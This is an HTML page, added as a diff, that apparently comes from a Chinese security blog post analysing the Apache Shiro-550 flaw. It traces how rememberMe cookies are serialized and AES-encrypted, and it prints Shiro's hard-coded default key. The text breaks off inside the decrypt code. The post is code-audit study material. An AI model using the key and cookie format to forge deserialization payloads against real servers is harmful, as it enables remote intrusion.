@@ -1,0 +1,1420 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Shiro-550, hackthebox,ctf,渗透">
+    <meta name="description" content="Shiro-5500x1 前言Shiro攻击payload经过AES加密，很多防护设备无法识别/拦截攻击
+0x2 环境搭建git clone https://github.com/apache/shiro.git  
+cd shiro
+gi">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Shiro-550 | l1b3r&#39;s blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.2">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">l1b3r&#39;s blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">l1b3r&#39;s blog</div>
+        <div class="logo-desc">
+            
+            高贵的灵魂是自己尊敬自己
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Shiro-550</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%8D%9A%E5%AE%A2/">
+                                <span class="chip bg-color">博客</span>
+                            </a>
+                        
+                            <a href="/tags/hexo/">
+                                <span class="chip bg-color">hexo</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                Java代码审计
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-10-07
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="Shiro-550"><a href="#Shiro-550" class="headerlink" title="Shiro-550"></a>Shiro-550</h1><h2 id="0x1-前言"><a href="#0x1-前言" class="headerlink" title="0x1 前言"></a>0x1 前言</h2><p>Shiro攻击payload经过AES加密，很多防护设备无法识别/拦截攻击</p>
+<h2 id="0x2-环境搭建"><a href="#0x2-环境搭建" class="headerlink" title="0x2 环境搭建"></a>0x2 环境搭建</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java">git clone https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>apache<span class="token operator">/</span>shiro<span class="token punctuation">.</span>git  
+cd shiro
+git checkout shiro<span class="token operator">-</span>root<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span><span class="token number">91</span>chi<span class="token punctuation">.</span>fun<span class="token comment">//https://github.com//apache/shiro/archive/refs/tags/shiro-root-1.2.4.zip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="0x3-分析代码："><a href="#0x3-分析代码：" class="headerlink" title="0x3 分析代码："></a>0x3 分析代码：</h2><h3 id="加密过程："><a href="#加密过程：" class="headerlink" title="加密过程："></a>加密过程：</h3><p>key硬编码：</p>
+<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_20.15.53.png" alt="截屏2022-05-24 20.15.53.png"></p>
+<p>发现<code>AbstractRememberMeManager继承了RememberMeManager</code>类，那么需要向上溯源，找到RemeberMeManager接口</p>
+<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_20.21.34.png" alt="截屏2022-05-24 20.21.34.png"></p>
+<p>发现一个onSuccessfullLogin方法，显示登陆成功后的步骤，那么给它打上断点，debug一下，记得勾选RememberMe。</p>
+<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_20.25.21.png" alt="截屏2022-05-24 20.25.21.png"></p>
+<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_20.24.05.png" alt="截屏2022-05-24 20.24.05.png"></p>
+<p>步进，转到<code>forgetIdentity</code> 方法 主要是处理request和response请求，跟进this.forgetIdentity方法</p>
+<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_20.27.03.png" alt="截屏2022-05-24 20.27.03.png"></p>
+<p>继续跟进this.forgetIdentity方法，进入了getCookie的removeFrom方法，跟进removeFrom方法</p>
+<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_20.52.06.png" alt="截屏2022-05-24 20.52.06.png"></p>
+<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_20.56.31.png" alt="截屏2022-05-24 20.56.31.png"></p>
+<p><code>"isRememberMe"主要是检查筛选了rememberMe按钮是否使用</code>,然后查看rememberIdentity方法</p>
+<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_20.57.59.png" alt="截屏2022-05-24 20.57.59.png"></p>
+<p>继续跟进rememberIdentity函数</p>
+<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_21.00.19.png" alt="截屏2022-05-24 21.00.19.png"></p>
+<p><code>convertPrincipalsToBytes</code> 看起来是转化为bytes，跟进看一下</p>
+<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_21.01.13.png" alt="截屏2022-05-24 21.01.13.png"></p>
+<p>发现进行了序列化，而且序列化的是传入的root用户名，就是普通的序列化。encrypt方法加密序列化后的二进制字节，跟进一下encrypt方法：</p>
+<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_21.01.59.png" alt="截屏2022-05-24 21.01.59.png"></p>
+<p>跟进后发现getCipherService()就是获取密码服务，还是跟进encrypt方法，看了一下是AES加密，getEncryptionCipherKey就是获取密钥</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialized<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> value <span class="token operator">=</span> serialized<span class="token punctuation">;</span>
+        <span class="token class-name">CipherService</span> cipherService <span class="token operator">=</span> <span class="token function">getCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>cipherService <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token class-name">ByteSource</span> byteSource <span class="token operator">=</span> cipherService<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>serialized<span class="token punctuation">,</span> <span class="token function">getEncryptionCipherKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            value <span class="token operator">=</span> byteSource<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_21.11.20.png" alt="截屏2022-05-24 21.11.20.png"></p>
+<p>获取了这个密钥：<code>kPH+bIxk5D2deZiIxcaaaA==</code>, 这时就是加密方法了</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">ByteSource</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> plaintext<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ivBytes <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+<span class="token comment">//生成初始化向量，随后generate：TRUE</span>
+        <span class="token keyword">boolean</span> generate <span class="token operator">=</span> <span class="token function">isGenerateInitializationVectors</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>generate<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<span class="token comment">//产生初始化向量</span>
+            ivBytes <span class="token operator">=</span> <span class="token function">generateInitializationVector</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//异常不会进入</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>ivBytes <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> ivBytes<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalStateException</span><span class="token punctuation">(</span><span class="token string">"Initialization vector generation is enabled - generated vector"</span> <span class="token operator">+</span>
+                        <span class="token string">"cannot be null or empty."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+<span class="token comment">//跟进具体方法，基本加密逻辑知道了，已知Key和IV</span>
+        <span class="token keyword">return</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> key<span class="token punctuation">,</span> ivBytes<span class="token punctuation">,</span> generate<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>跟进看一下IV如何计算（随机生成）</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">generateInitializationVector</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> streaming<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">int</span> size <span class="token operator">=</span> <span class="token function">getInitializationVectorSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token class-name">String</span> msg <span class="token operator">=</span> <span class="token string">"initializationVectorSize property must be greater than zero.  This number is "</span> <span class="token operator">+</span>
+                    <span class="token string">"typically set in the "</span> <span class="token operator">+</span> <span class="token class-name">CipherService</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getSimpleName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" subclass constructor.  "</span> <span class="token operator">+</span>
+                    <span class="token string">"Also check your configuration to ensure that if you are setting a value, it is positive."</span><span class="token punctuation">;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalStateException</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">%</span> <span class="token constant">BITS_PER_BYTE</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token class-name">String</span> msg <span class="token operator">=</span> <span class="token string">"initializationVectorSize property must be a multiple of 8 to represent as a byte array."</span><span class="token punctuation">;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalStateException</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">int</span> sizeInBytes <span class="token operator">=</span> size <span class="token operator">/</span> <span class="token constant">BITS_PER_BYTE</span><span class="token punctuation">;</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ivBytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>sizeInBytes<span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token class-name">SecureRandom</span> random <span class="token operator">=</span> <span class="token function">ensureSecureRandom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        random<span class="token punctuation">.</span><span class="token function">nextBytes</span><span class="token punctuation">(</span>ivBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> ivBytes<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>对获得的反序列化数据进行base64加密，然后添加到cookie中</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> base64 <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>serialized<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">Cookie</span> template <span class="token operator">=</span> <span class="token function">getCookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//the class attribute is really a template for the outgoing cookies</span>
+        <span class="token class-name">Cookie</span> cookie <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleCookie</span><span class="token punctuation">(</span>template<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        cookie<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>base64<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        cookie<span class="token punctuation">.</span><span class="token function">saveTo</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="解密过程："><a href="#解密过程：" class="headerlink" title="解密过程："></a>解密过程：</h3><p>之前调用了AbstractRememberMeManager.encrypt进行加密，那么猜测在AbstractRememberMeManager中存在decrypt解密函数</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encrypted<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialized <span class="token operator">=</span> encrypted<span class="token punctuation">;</span>
+        <span class="token class-name">CipherService</span> cipherService <span class="token operator">=</span> <span class="token function">getCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>cipherService <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token class-name">ByteSource</span> byteSource <span class="token operator">=</span> cipherService<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> <span class="token function">getDecryptionCipherKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            serialized <span class="token operator">=</span> byteSource<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> serialized<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>跟进getCipherService方法看一下，和之前的操作相同，再看一下decrypt方法：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">ByteSource</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ciphertext<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CryptoException</span> <span class="token punctuation">{</span>
+
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encrypted <span class="token operator">=</span> ciphertext<span class="token punctuation">;</span>
+
+        <span class="token comment">//No IV, check if we need to read the IV from the stream:</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> iv <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isGenerateInitializationVectors</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                <span class="token comment">//We are generating IVs, so the ciphertext argument array is not actually 100% cipher text.  Instead, it</span>
+                <span class="token comment">//is:</span>
+                <span class="token comment">// - the first N bytes is the initialization vector, where N equals the value of the</span>
+                <span class="token comment">// 'initializationVectorSize' attribute.</span>
+                <span class="token comment">// - the remaining bytes in the method argument (arg.length - N) is the real cipher text.</span>
+
+                <span class="token comment">//So we need to chunk the method argument into its constituent parts to find the IV and then use</span>
+                <span class="token comment">//the IV to decrypt the real ciphertext:</span>
+
+                <span class="token keyword">int</span> ivSize <span class="token operator">=</span> <span class="token function">getInitializationVectorSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">int</span> ivByteSize <span class="token operator">=</span> ivSize <span class="token operator">/</span> <span class="token constant">BITS_PER_BYTE</span><span class="token punctuation">;</span>
+
+                <span class="token comment">//now we know how large the iv is, so extract the iv bytes:</span>
+                iv <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>ivByteSize<span class="token punctuation">]</span><span class="token punctuation">;</span>
+                <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">arraycopy</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> iv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> ivByteSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                <span class="token comment">//remaining data is the actual encrypted ciphertext.  Isolate it:</span>
+                <span class="token keyword">int</span> encryptedSize <span class="token operator">=</span> ciphertext<span class="token punctuation">.</span>length <span class="token operator">-</span> ivByteSize<span class="token punctuation">;</span>
+                encrypted <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>encryptedSize<span class="token punctuation">]</span><span class="token punctuation">;</span>
+                <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">arraycopy</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> ivByteSize<span class="token punctuation">,</span> encrypted<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> encryptedSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token class-name">String</span> msg <span class="token operator">=</span> <span class="token string">"Unable to correctly extract the Initialization Vector or ciphertext."</span><span class="token punctuation">;</span>
